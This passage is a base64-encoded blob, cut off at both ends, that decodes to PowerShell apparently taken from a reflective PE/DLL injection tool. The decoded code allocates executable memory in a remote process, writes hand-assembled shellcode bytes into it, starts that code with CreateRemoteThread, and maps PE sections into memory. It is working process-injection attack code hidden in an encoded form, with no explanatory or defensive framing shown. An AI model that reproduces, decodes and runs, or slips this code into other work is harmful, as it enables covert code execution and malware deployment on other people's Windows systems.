gdGhpcyBtZW1vcnkKICAgICAgICAgICAgW0ludFB0cl0kUmV0dXJuVmFsTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQdHJTaXplKQogICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLlJlYWRQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJExvYWRMaWJyYXJ5QVJldE1lbSwgJFJldHVyblZhbE1lbSwgW1VJbnRQdHJdW1VJbnQ2NF0kUHRyU2l6ZSwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQogICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiQ2FsbCB0byBSZWFkUHJvY2Vzc01lbW9yeSBmYWlsZWQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgW0ludFB0cl0kRGxsQWRkcmVzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRSZXR1cm5WYWxNZW0sIFtUeXBlXVtJbnRQdHJdKQoKICAgICAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkTG9hZExpYnJhcnlBUmV0TWVtLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAogICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBbSW50UHRyXSRSVGhyZWFkSGFuZGxlID0gQ3JlYXRlLVJlbW90ZVRocmVhZCAtUHJvY2Vzc0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtU3RhcnRBZGRyZXNzICRMb2FkTGlicmFyeUFBZGRyIC1Bcmd1bWVudFB0ciAkUkltcG9ydERsbFBhdGhQdHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucwogICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLldhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRSVGhyZWFkSGFuZGxlLCAyMDAwMCkKICAgICAgICAgICAgaWYgKCRSZXN1bHQgLW5lIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIENyZWF0ZVJlbW90ZVRocmVhZCB0byBjYWxsIEdldFByb2NBZGRyZXNzIGZhaWxlZC4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIFtJbnQzMl0kRXhpdENvZGUgPSAwCiAgICAgICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuR2V0RXhpdENvZGVUaHJlYWQuSW52b2tlKCRSVGhyZWFkSGFuZGxlLCBbUmVmXSRFeGl0Q29kZSkKICAgICAgICAgICAgaWYgKCgkUmVzdWx0IC1lcSAwKSAtb3IgKCRFeGl0Q29kZSAtZXEgMCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIEdldEV4aXRDb2RlVGhyZWFkIGZhaWxlZCIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgW0ludFB0cl0kRGxsQWRkcmVzcyA9IFtJbnRQdHJdJEV4aXRDb2RlCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJJbXBvcnREbGxQYXRoUHRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAogICAgICAgIAogICAgICAgIHJldHVybiAkRGxsQWRkcmVzcwogICAgfQogICAgCiAgICAKICAgIEZ1bmN0aW9uIEdldC1SZW1vdGVQcm9jQWRkcmVzcwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRSZW1vdGVQcm9jSGFuZGxlLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MSwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRSZW1vdGVEbGxIYW5kbGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0yLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJEZ1bmN0aW9uTmFtZVB0ciwjVGhpcyBjYW4gZWl0aGVyIGJlIGEgcHRyIHRvIGEgc3RyaW5nIHdoaWNoIGlzIHRoZSBmdW5jdGlvbiBuYW1lLCBvciwgaWYgTG9hZEJ5T3JkaW5hbCBpcyAndHJ1ZScgdGhpcyBpcyBhbiBvcmRpbmFsIG51bWJlciAocG9pbnRzIHRvIG5vdGhpbmcpCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MywgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbQm9vbF0KICAgICAgICAkTG9hZEJ5T3JkaW5hbAogICAgICAgICkKCiAgICAgICAgJFB0clNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pCgogICAgICAgIFtJbnRQdHJdJFJGdW5jTmFtZVB0ciA9IFtJbnRQdHJdOjpaZXJvICAgI1BvaW50ZXIgdG8gdGhlIGZ1bmN0aW9uIG5hbWUgaW4gcmVtb3RlIHByb2Nlc3MgbWVtb3J5IGlmIGxvYWRpbmcgYnkgZnVuY3Rpb24gbmFtZSwgb3JkaW5hbCBudW1iZXIgaWYgbG9hZGluZyBieSBvcmRpbmFsCiAgICAgICAgI0lmIG5vdCBsb2FkaW5nIGJ5IG9yZGluYWwsIHdyaXRlIHRoZSBmdW5jdGlvbiBuYW1lIHRvIHRoZSByZW1vdGUgcHJvY2VzcyBtZW1vcnkKICAgICAgICBpZiAoLW5vdCAkTG9hZEJ5T3JkaW5hbCkKICAgICAgICB7CiAgICAgICAgICAgICRGdW5jdGlvbk5hbWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJEZ1bmN0aW9uTmFtZVB0cikKCiAgICAgICAgICAgICNXcml0ZSBGdW5jdGlvbk5hbWUgdG8gbWVtb3J5ICh3aWxsIGJlIHVzZWQgaW4gR2V0UHJvY0FkZHJlc3MpCiAgICAgICAgICAgICRGdW5jdGlvbk5hbWVTaXplID0gW1VJbnRQdHJdW1VJbnQ2NF0oW1VJbnQ2NF0kRnVuY3Rpb25OYW1lLkxlbmd0aCArIDEpCiAgICAgICAgICAgICRSRnVuY05hbWVQdHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgJEZ1bmN0aW9uTmFtZVNpemUsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFEV1JJVEUpCiAgICAgICAgICAgIGlmICgkUkZ1bmNOYW1lUHRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIgogICAgICAgICAgICB9CgogICAgICAgICAgICBbVUludFB0cl0kTnVtQnl0ZXNXcml0dGVuID0gW1VJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSRnVuY05hbWVQdHIsICRGdW5jdGlvbk5hbWVQdHIsICRGdW5jdGlvbk5hbWVTaXplLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgICAgIGlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIHdyaXRlIERMTCBwYXRoIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJEZ1bmN0aW9uTmFtZVNpemUgLW5lICROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJEaWRuJ3Qgd3JpdGUgdGhlIGV4cGVjdGVkIGFtb3VudCBvZiBieXRlcyB3aGVuIHdyaXRpbmcgYSBETEwgcGF0aCB0byBsb2FkIHRvIHRoZSByZW1vdGUgcHJvY2VzcyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAjSWYgbG9hZGluZyBieSBvcmRpbmFsLCBqdXN0IHNldCBSRnVuY05hbWVQdHIgdG8gYmUgdGhlIG9yZGluYWwgbnVtYmVyCiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJFJGdW5jTmFtZVB0ciA9ICRGdW5jdGlvbk5hbWVQdHIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgI0dldCBhZGRyZXNzIG9mIEdldFByb2NBZGRyZXNzCiAgICAgICAgJEtlcm5lbDMySGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoImtlcm5lbDMyLmRsbCIpCiAgICAgICAgJEdldFByb2NBZGRyZXNzQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbDMySGFuZGxlLCAiR2V0UHJvY0FkZHJlc3MiKSAjS2VybmVsMzIgbG9hZGVkIHRvIHRoZSBzYW1lIGFkZHJlc3MgZm9yIGFsbCBwcm9jZXNzZXMKCiAgICAgICAgCiAgICAgICAgI0FsbG9jYXRlIG1lbW9yeSBmb3IgdGhlIGFkZHJlc3MgcmV0dXJuZWQgYnkgR2V0UHJvY0FkZHJlc3MKICAgICAgICAkR2V0UHJvY0FkZHJlc3NSZXRNZW0gPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnQ2NF1bVUludDY0XSRQdHJTaXplLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQogICAgICAgIGlmICgkR2V0UHJvY0FkZHJlc3NSZXRNZW0gLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciB0aGUgcmV0dXJuIHZhbHVlIG9mIEdldFByb2NBZGRyZXNzIgogICAgICAgIH0KICAgICAgICAKICAgICAgICAKICAgICAgICAjV3JpdGUgU2hlbGxjb2RlIHRvIHRoZSByZW1vdGUgcHJvY2VzcyB3aGljaCB3aWxsIGNhbGwgR2V0UHJvY0FkZHJlc3MKICAgICAgICAjU2hlbGxjb2RlOiBHZXRQcm9jQWRkcmVzcy5hc20KICAgICAgICBbQnl0ZVtdXSRHZXRQcm9jQWRkcmVzc1NDID0gQCgpCiAgICAgICAgaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzEgPSBAKDB4NTMsIDB4NDgsIDB4ODksIDB4ZTMsIDB4NDgsIDB4ODMsIDB4ZWMsIDB4MjAsIDB4NjYsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4NDgsIDB4YjkpCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzc1NDMiA9IEAoMHg0OCwgMHhiYSkKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzU0MzID0gQCgweDQ4LCAweGI4KQogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzQgPSBAKDB4ZmYsIDB4ZDAsIDB4NDgsIDB4YjkpCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzc1NDNSA9IEAoMHg0OCwgMHg4OSwgMHgwMSwgMHg0OCwgMHg4OSwgMHhkYywgMHg1YiwgMHhjMykKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzU0MxID0gQCgweDUzLCAweDg5LCAweGUzLCAweDgzLCAweGU0LCAweGMwLCAweGI4KQogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzIgPSBAKDB4YjkpCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzc1NDMyA9IEAoMHg1MSwgMHg1MCwgMHhiOCkKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzU0M0ID0gQCgweGZmLCAweGQwLCAweGI5KQogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzUgPSBAKDB4ODksIDB4MDEsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCiAgICAgICAgfQogICAgICAgICRTQ0xlbmd0aCA9ICRHZXRQcm9jQWRkcmVzc1NDMS5MZW5ndGggKyAkR2V0UHJvY0FkZHJlc3NTQzIuTGVuZ3RoICsgJEdldFByb2NBZGRyZXNzU0MzLkxlbmd0aCArICRHZXRQcm9jQWRkcmVzc1NDNC5MZW5ndGggKyAkR2V0UHJvY0FkZHJlc3NTQzUuTGVuZ3RoICsgKCRQdHJTaXplICogNCkKICAgICAgICAkU0NQU01lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkU0NMZW5ndGgpCiAgICAgICAgJFNDUFNNZW1PcmlnaW5hbCA9ICRTQ1BTTWVtCiAgICAgICAgCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJEdldFByb2NBZGRyZXNzU0MxIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJEdldFByb2NBZGRyZXNzU0MxLkxlbmd0aCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkUmVtb3RlRGxsSGFuZGxlLCAkU0NQU01lbSwgJGZhbHNlKQogICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQogICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRHZXRQcm9jQWRkcmVzc1NDMiAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQogICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRHZXRQcm9jQWRkcmVzc1NDMi5MZW5ndGgpCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJFJGdW5jTmFtZVB0ciwgJFNDUFNNZW0sICRmYWxzZSkKICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzMgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzMuTGVuZ3RoKQogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRHZXRQcm9jQWRkcmVzc0FkZHIsICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJEdldFByb2NBZGRyZXNzU0M0IC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJEdldFByb2NBZGRyZXNzU0M0Lkxlbmd0aCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkR2V0UHJvY0FkZHJlc3NSZXRNZW0sICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJEdldFByb2NBZGRyZXNzU0M1IC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJEdldFByb2NBZGRyZXNzU0M1Lkxlbmd0aCkKICAgICAgICAKICAgICAgICAkUlNDQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQogICAgICAgIGlmICgkUlNDQWRkciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgZm9yIHNoZWxsY29kZSIKICAgICAgICB9CiAgICAgICAgW1VJbnRQdHJdJE51bUJ5dGVzV3JpdHRlbiA9IFtVSW50UHRyXTo6WmVybwogICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCAkU0NQU01lbU9yaWdpbmFsLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQogICAgICAgIGlmICgoJFN1Y2Nlc3MgLWVxICRmYWxzZSkgLW9yIChbVUludDY0XSROdW1CeXRlc1dyaXR0ZW4gLW5lIFtVSW50NjRdJFNDTGVuZ3RoKSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRSVGhyZWFkSGFuZGxlID0gQ3JlYXRlLVJlbW90ZVRocmVhZCAtUHJvY2Vzc0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtU3RhcnRBZGRyZXNzICRSU0NBZGRyIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMKICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLldhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRSVGhyZWFkSGFuZGxlLCAyMDAwMCkKICAgICAgICBpZiAoJFJlc3VsdCAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIENyZWF0ZVJlbW90ZVRocmVhZCB0byBjYWxsIEdldFByb2NBZGRyZXNzIGZhaWxlZC4iCiAgICAgICAgfQogICAgICAgIAogICAgICAgICNUaGUgcHJvY2VzcyBhZGRyZXNzIGlzIHdyaXR0ZW4gdG8gbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBhdCBhZGRyZXNzICRHZXRQcm9jQWRkcmVzc1JldE1lbSwgcmVhZCB0aGlzIG1lbW9yeQogICAgICAgIFtJbnRQdHJdJFJldHVyblZhbE1lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkUHRyU2l6ZSkKICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLlJlYWRQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJEdldFByb2NBZGRyZXNzUmV0TWVtLCAkUmV0dXJuVmFsTWVtLCBbVUludFB0cl1bVUludDY0XSRQdHJTaXplLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgaWYgKCgkUmVzdWx0IC1lcSAkZmFsc2UpIC1vciAoJE51bUJ5dGVzV3JpdHRlbiAtZXEgMCkpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiQ2FsbCB0byBSZWFkUHJvY2Vzc01lbW9yeSBmYWlsZWQiCiAgICAgICAgfQogICAgICAgIFtJbnRQdHJdJFByb2NBZGRyZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFJldHVyblZhbE1lbSwgW1R5cGVdW0ludFB0cl0pCgogICAgICAgICNDbGVhbnVwIHJlbW90ZSBwcm9jZXNzIG1lbW9yeQogICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkR2V0UHJvY0FkZHJlc3NSZXRNZW0sIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCgogICAgICAgIGlmICgtbm90ICRMb2FkQnlPcmRpbmFsKQogICAgICAgIHsKICAgICAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUkZ1bmNOYW1lUHRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gJFByb2NBZGRyZXNzCiAgICB9CgoKICAgIEZ1bmN0aW9uIENvcHktU2VjdGlvbnMKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtCeXRlW11dCiAgICAgICAgJFBFQnl0ZXMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkUEVJbmZvLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyVHlwZXMKICAgICAgICApCiAgICAgICAgCiAgICAgICAgZm9yKCAkaSA9IDA7ICRpIC1sdCAkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuRmlsZUhlYWRlci5OdW1iZXJPZlNlY3Rpb25zOyAkaSsrKQogICAgICAgIHsKICAgICAgICAgICAgW0ludFB0cl0kU2VjdGlvbkhlYWRlclB0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5TZWN0aW9uSGVhZGVyUHRyKSAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfU0VDVElPTl9IRUFERVIpKSkKICAgICAgICAgICAgJFNlY3Rpb25IZWFkZXIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkU2VjdGlvbkhlYWRlclB0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfU0VDVElPTl9IRUFERVIpCiAgICAgICAgCiAgICAgICAgICAgICNBZGRyZXNzIHRvIGNvcHkgdGhlIHNlY3Rpb24gdG8KICAgICAgICAgICAgW0ludFB0cl0kU2VjdGlvbkRlc3RBZGRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRTZWN0aW9uSGVhZGVyLlZpcnR1YWxBZGRyZXNzKSkKICAgICAgICAgICAgCiAgICAgICAgICAgICNTaXplT2ZSYXdEYXRhIGlzIHRoZSBzaXplIG9mIHRoZSBkYXRhIG9uIGRpc2ssIFZpcnR1YWxTaXplIGlzIHRoZSBtaW5pbXVtIHNwYWNlIHRoYXQgY2FuIGJlIGFsbG9jYXRlZAogICAgICAgICAgICAjICAgIGluIG1lbW9yeSBmb3IgdGhlIHNlY3Rpb24uIElmIFZpcnR1YWxTaXplID4gU2l6ZU9mUmF3RGF0YSwgcGFkIHRoZSBleHRyYSBzcGFjZXMgd2l0aCAwLiBJZgogICAgICAgICAgICAjICAgIFNpemVPZlJhd0RhdGEgPiBWaXJ0dWFsU2l6ZSwgaXQgaXMgYmVjYXVzZSB0aGUgc2VjdGlvbiBzdG9yZWQgb24gZGlzayBoYXMgcGFkZGluZyB0aGF0IHdlIGNhbiB0aHJvdyBhd2F5LAogICAgICAgICAgICAjICAgIHNvIHRydW5jYXRlIFNpemVPZlJhd0RhdGEgdG8gVmlydHVhbFNpemUKICAgICAgICAgICAgJFNpemVPZlJhd0RhdGEgPSAkU2VjdGlvbkhlYWRlci5TaXplT2ZSYXdEYXRhCgogICAgICAgICAgICBpZiAoJFNlY3Rpb25IZWFkZXIuUG9pbnRlclRvUmF3RGF0YSAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNpemVPZlJhd0RhdGEgPSAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgkU2l6ZU9mUmF3RGF0YSAtZ3QgJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTaXplT2ZSYXdEYXRhID0gJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemUKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCRTaXplT2ZSYXdEYXRhIC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUZXN0LU1lbW9yeVJhbmdlVmFsaWQgLURlYnVnU3RyaW5nICJDb3B5LVNlY3Rpb25zOjpNYXJzaGFsQ29weSIgLVBFSW5mbyAkUEVJbmZvIC1TdGFydEFkZHJlc3MgJFNlY3Rpb25EZXN0QWRkciAtU2l6ZSAkU2l6ZU9mUmF3RGF0YSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcn